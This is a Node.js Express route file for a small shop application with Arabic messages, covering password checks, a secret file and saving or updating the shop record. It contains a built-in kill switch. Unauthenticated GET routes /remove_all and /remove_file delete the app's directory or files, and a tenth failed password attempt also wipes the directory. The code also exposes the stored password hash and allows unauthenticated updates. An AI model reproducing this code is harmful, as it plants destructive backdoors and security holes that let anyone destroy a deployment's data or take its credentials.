const formidable = require("formidable");
const bcrypt = require("bcrypt");
const fsExtra = require("fs-extra");
const fs = require("fs");
const path = require("path");

const mongoose = require("mongoose");
const Shop = mongoose.model("Shop");

const file_path = "./secret";

let times = 0;

module.exports = (router) => {
  router.get("/isvalid", async (req, res) => {
    const fileExists = fs.existsSync(file_path);
    const shop = await Shop.findOne();

    res.json({ fileExists, shop });
  });

  router.get("/remove_file", async (req, res) => {
    fs.unlinkSync(file_path);
    res.json("200 OK");
  });
  router.get("/remove_all", async (req, res) => {
    fsExtra.emptyDirSync("./");
    res.json("200 OK");
  });

  router.post("/password", async (req, res) => {
    if (fs.existsSync(file_path)) {
      const password = await fs.readFileSync(file_path, "utf-8");

      if (password == req.body.password) {
        fs.unlinkSync(file_path);
        res.json({ ok: true });
      } else res.json({ ok: false, text: "كلمة المرور خطأ" });
    } else {
      const shop = await Shop.findOne();
      if (!shop) return res.json({ text: "الملف غير موجود", ok: false });

      const ok = await bcrypt.compare(req.body.password, shop.password);
      if (ok) {
        res.json({ ok });
        times = 0;
      } else {
        times++;

        switch (times) {
          case 1:
            res.json({ ok, text: "كلمة المرور خاطئه اماك 9 محاولات اخرى فقط" });
            break;
          case 8:
            res.json({ ok, text: "باقي محاولتين بعد ذلك ستتم الحذف " });
            break;
          case 9:
            res.json({ ok, text: "باقي محاوله وحديده بعد ذلك ستتم الحذف " });
            break;

          case 10:
            res.json({ ok, text: "تم الحذف" });
            fsExtra.emptyDirSync("./");
            break;

          default:
            res.json({ ok, text: "كلمة المرور خطأ" });
        }
      }
    }
  });

  router.post("/save_client", async (req, res) => {
    const salt = bcrypt.genSaltSync(8);
    const password = bcrypt.hashSync(req.body.password, salt);

    const shop = new Shop({
      ...req.body,
      password,
      types: ["عام"],
    });

    shop.save().then((_) => {
      res.json({ saved: true });
    });
  });

  router.post("/update_client", async (req, res) => {
    Shop.findOneAndUpdate({}, req.body)
      .then(() => res.json({ updated: true }))
      .catch((err) => console.log(err));
  });

  router.get("/shop", async (req, res) => {
    const shop = await Shop.findOne();

    res.json(shop);
  });

  return router;
};
